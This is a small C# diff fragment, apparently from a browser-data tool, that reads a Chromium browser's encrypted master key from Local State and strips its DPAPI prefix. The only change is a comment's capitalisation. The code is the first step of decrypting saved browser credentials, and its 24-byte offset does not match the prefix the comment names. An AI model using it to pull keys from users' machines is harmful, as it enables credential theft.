@@ -51,7 +51,7 @@ namespace UserData
 			string base64Key = localStateObject.SelectToken("os_crypt.encrypted_key").ToString();
 			byte[] keyBytes = Convert.FromBase64String(base64Key);
 
-			// Delete "DPAPI\x01\x00\x00\x00"from bytes array
+			// delete "DPAPI\x01\x00\x00\x00"from bytes array
 			byte[] decryptedKeyBytes = new byte[keyBytes.Length - 24];
 			Array.Copy(keyBytes, 24, decryptedKeyBytes, 0, decryptedKeyBytes.Length);
 
